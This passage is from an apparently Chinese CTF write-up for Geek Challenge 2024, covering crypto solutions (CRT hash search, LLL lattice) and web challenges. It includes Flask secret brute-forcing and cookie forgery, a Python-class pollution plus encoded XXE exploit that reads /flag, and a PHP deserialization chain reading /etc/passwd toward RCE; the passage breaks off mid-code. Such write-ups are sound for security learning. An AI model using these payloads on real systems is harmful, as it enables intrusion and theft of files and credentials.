class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    l=lcm(l,m[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    y=x+k*l</span><br><span class="line">    h1=hashlib.sha256(<span class="built_in">str</span>(y).encode()).hexdigest()</span><br><span class="line">    h2=hashlib.sha256(long_to_bytes(y)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> h1[:<span class="number">5</span>]==<span class="string">&#x27;6a651&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;case 1&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(k)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;SYC&#123;&#123;<span class="subst">&#123;h1&#125;</span>&#125;&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> h2[:<span class="number">5</span>]==<span class="string">&#x27;6a651&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;case 2&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(k)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;SYC&#123;&#123;<span class="subst">&#123;h2&#125;</span>&#125;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#case 1</span></span><br><span class="line"><span class="comment">#3804</span></span><br><span class="line"><span class="comment">#SYC&#123;6a651b7ce47b35cc1aca565028fb633fab9e35ca08e45d5ce987a6caeb500465&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="LLL"><a href="#LLL" class="headerlink" title="LLL"></a>LLL</h3><blockquote><p>基础LLL，flag前缀为SYC{xx}</p></blockquote><p>构造格，加大系数 $K=2^{176}$ 配平：</p><p>$(m,-1,k)\begin{bmatrix} 1 &amp; 0 &amp; a \newline 0 &amp; K &amp; b \newline 0 &amp; 0 &amp; p \end{bmatrix}=(m,-K,-c)$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = <span class="number">169790849804323540946197204708402762862586197604183102589270741859708550301920348112941305999764092197996929298474590062625556806793613268527763774013772685954699561684244945434843656515307801882995934869499880288594142919381501796488815033294127591623260894764750214588993456840404443515671353802614450411717</span></span><br><span class="line">b = <span class="number">87985708831523238980948938165414984318379459926002798504435964538203443877988599888615810231215118828138306895572062833107988965151522391460216837691927960249874511818878134399363147008042562222910234739940697553852540265617603482995091203105040187460485673579382171260197291783748886765929376179151804062085</span></span><br><span class="line">p = <span class="number">131724494512065658801039766546788821718063963144467818735768040631367069153816254855229655449559099188694403260044990366292026916085340250077198735215774149087025577263769846650728593180101073940507285459917860726551385227481715873503612683249433020201729190862430476054822102865441136763977415824331858801617</span></span><br><span class="line"></span><br><span class="line">K = <span class="number">2</span>^<span class="number">176</span></span><br><span class="line">M = matrix(ZZ,[[<span class="number">1</span>,<span class="number">0</span>,a],[<span class="number">0</span>,K,b],[<span class="number">0</span>,<span class="number">0</span>,p]])</span><br><span class="line">L = M.LLL()</span><br><span class="line"><span class="built_in">print</span>(L)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">abs</span>(L[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;SYC&#123;1e989433efffd767589e989ad0f091075c06&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web"></a>Web</h2><h3 id="py-game"><a href="#py-game" class="headerlink" title="py_game"></a>py_game</h3><blockquote><p>学习累了就来玩玩游戏休息一下吧</p><p>通关真的会给flag吗?</p></blockquote><p>注册，拿到cookie，用flask-unsign爆破flask key：</p><p><code>flask-unsign --unsign --cookie &#39;eyJ1c2VybmFtZSI6ImFhYSJ9.ZyUUjg.WtjPt0cu-uBZcQP4mlALEs-LrWM&#39; --wordlist rockyou.txt --no-literal-eval</code></p><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Session decodes to: &#123;&#x27;username&#x27;: &#x27;aaa&#x27;&#125;</span><br><span class="line">[*] Starting brute-forcer with 8 threads..</span><br><span class="line">[+] Found secret key after 768 attempts</span><br><span class="line">b&#x27;a123456&#x27;</span><br></pre></td></tr></table></figure><p>伪造admin：</p><p><code>flask-unsign --sign --cookie &quot;&#123;&#39;username&#39;: &#39;admin&#39;&#125;&quot; --secret a123456</code></p><p>替换cookie，以admin进入 <code>/admin</code> 路由，下载 <code>app.pyc</code>，反编译：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, flash, redirect, url_for, session, Response, send_file, jsonify</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;a123456&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;xml_data&#x27;</span>] = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;GeekChallenge2024&gt;&lt;EventName&gt;Geek Challenge&lt;/EventName&gt;&lt;Year&gt;2024&lt;/Year&gt;&lt;Description&gt;This is a challenge event for geeks in the year 2024.&lt;/Description&gt;&lt;/GeekChallenge2024&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">return</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">admin = User(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;123456j1rrynonono&#x27;</span>)</span><br><span class="line">Users = [admin]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">                update(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">            update(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> Users:</span><br><span class="line">            <span class="keyword">if</span> u.username == username:</span><br><span class="line">                flash(<span class="string">&#x27;用户名已存在&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        new_user = User(username, password)</span><br><span class="line">        Users.append(new_user)</span><br><span class="line">        flash(<span class="string">&#x27;注册成功！请登录&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> Users:</span><br><span class="line">            <span class="keyword">if</span> u.check(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;):</span><br><span class="line">                session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">                flash(<span class="string">&#x27;登录成功&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line">        flash(<span class="string">&#x27;用户名或密码错误&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/play&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/app/templates/play.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            play_html = file.read()</span><br><span class="line">        <span class="keyword">return</span> play_html</span><br><span class="line">    flash(<span class="string">&#x27;请先登录&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">    flash(<span class="string">&#x27;你没有权限访问&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/downloads321&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">downloads321</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;./source/app.pyc&#x27;</span>, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        is_admin = session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> is_admin:</span><br><span class="line">            user_tag = <span class="string">&#x27;Admin User&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            user_tag = <span class="string">&#x27;Normal User&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], tag=user_tag, is_admin=is_admin)</span><br><span class="line">    flash(<span class="string">&#x27;请先登录&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/xml_parse&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xml_parse</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        xml_bytes = app.config[<span class="string">&#x27;xml_data&#x27;</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        parser = etree.XMLParser(load_dtd=<span class="literal">True</span>, resolve_entities=<span class="literal">True</span>)</span><br><span class="line">        tree = etree.fromstring(xml_bytes, parser=parser)</span><br><span class="line">        result_xml = etree.tostring(tree, pretty_print=<span class="literal">True</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, xml_declaration=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> Response(result_xml, mimetype=<span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> etree.XMLSyntaxError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">black_list = [<span class="string">&#x27;__class__&#x27;</span>.encode(), <span class="string">&#x27;__init__&#x27;</span>.encode(), <span class="string">&#x27;__globals__&#x27;</span>.encode()]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/update&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_route</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.data:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                    <span class="keyword">return</span> (<span class="string">&#x27;NONONO, Bad Hacker&#x27;</span>, <span class="number">403</span>)</span><br><span class="line">                data = json.loads(request.data.decode())</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">all</span>((<span class="string">&#x27;static&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="string">&#x27;dtd&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> (<span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value)) <span class="keyword">and</span> (<span class="string">&#x27;environ&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value)) <span class="keyword">for</span> value <span class="keyword">in</span> data.values())):</span><br><span class="line">                    update(data, User)</span><br><span class="line">                    <span class="keyword">return</span> (jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;更新成功&#x27;</span>&#125;), <span class="number">200</span>)</span><br><span class="line">                <span class="keyword">return</span> (<span class="string">&#x27;Invalid character&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> (<span class="string">f&#x27;Exception: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>, <span class="number">500</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">&#x27;No data provided&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flash(<span class="string">&#x27;你没有权限访问&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>审计代码，<code>/update</code> 原型链污染 <code>app.config[&#39;xml_data&#39;]</code>  为恶意xml代码，再访问 <code>/xml_parse</code> 触发XXE漏洞读文件。</p><p>原型链污染部分，用unicode编码绕过字符串过滤；XXE部分，将payload编码为UTF-16BE绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://80-cdb52045-af65-4bfe-96b9-57db1b26eac5.challenge.ctfplus.cn&#x27;</span></span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&#x27;session&#x27;</span>:<span class="string">&#x27;eyJ1c2VybmFtZSI6ImFkbWluIn0.ZyUV7A.z-zuf8kzQ61LEbcsR7J4i80SyP0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xml_data = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&#x27;</span></span><br><span class="line">xml_data2 = os.popen(<span class="string">f&#x27;&#x27;&#x27;echo &#x27;<span class="subst">&#123;xml_data&#125;</span>&#x27;| iconv -f utf-8 -t utf-16be&#x27;&#x27;&#x27;</span>).read()</span><br><span class="line"><span class="built_in">print</span>(xml_data2)</span><br><span class="line">json = &#123;</span><br><span class="line">    <span class="string">&#x27;\u005f_init__&#x27;</span>:&#123;</span><br><span class="line">        <span class="string">&#x27;\u005f_globals__&#x27;</span>:&#123;</span><br><span class="line">            <span class="string">&#x27;app&#x27;</span>:&#123;</span><br><span class="line">                <span class="string">&#x27;config&#x27;</span>:&#123;</span><br><span class="line">                    <span class="string">&#x27;xml_data&#x27;</span>:xml_data2</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/update&#x27;</span>,json=json,cookies=cookie)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">r = requests.get(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/xml_parse&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>输出flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;\u66f4\u65b0\u6210\u529f&quot;&#125;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;</span><br><span class="line">&lt;foo&gt;SYC&#123;4eb08b2f-73a0-4088-9f64-4d6255918cc6&#125;</span><br><span class="line">&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="PHP不比Java差"><a href="#PHP不比Java差" class="headerlink" title="PHP不比Java差"></a>PHP不比Java差</h3><blockquote><p>Java有的我们PHP也有</p></blockquote><p>反序列化链构造思路：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$FUNC=$change($data);</span><br><span class="line">$FUNC();</span><br><span class="line"></span><br><span class="line">$data为反序列化类中的变量和值构成的array</span><br><span class="line">利用 [new Challenge(),&#x27;Sink&#x27;]() 动态调用</span><br><span class="line"></span><br><span class="line">$eee=new $this-&gt;Where($this-&gt;IS);</span><br><span class="line">$fff=$this-&gt;Starven;</span><br><span class="line">$eee-&gt;$fff($this-&gt;Girlfriend);</span><br><span class="line"></span><br><span class="line">(new $a($b))-&gt;$c($d); 型</span><br><span class="line">用原生类实现</span><br></pre></td></tr></table></figure><p>先构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Challenge</span>:</span><br><span class="line">    public_file=<span class="string">&#x27;/etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Geek</span>:</span><br><span class="line">    public_a=<span class="string">&#x27;x&#x27;</span></span><br><span class="line">    public_b=[Challenge(),<span class="string">&#x27;Sink&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(serialize(Geek()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:4:&quot;Geek&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;x&quot;;s:1:&quot;b&quot;;a:2:&#123;i:0;O:9:&quot;Challenge&quot;:1:&#123;s:4:&quot;file&quot;;s:11:&quot;/etc/passwd&quot;;&#125;i:1;s:4:&quot;Sink&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?change=next</span><br><span class="line">POST</span><br><span class="line">data=O:4:&quot;Geek&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;x&quot;;s:1:&quot;b&quot;;a:2:&#123;i:0;O:9:&quot;Challenge&quot;:1:&#123;s:4:&quot;file&quot;;s:11:&quot;/etc/passwd&quot;;&#125;i:1;s:4:&quot;Sink&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到提示：<code>The True Flag is in /flag</code></p><p>RCE构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Syclover</span>:</span><br><span class="line">    public_Where=<span class="string">&#x27;ReflectionFunction&#x27;</span></span><br><span class="line">    public_IS=<span 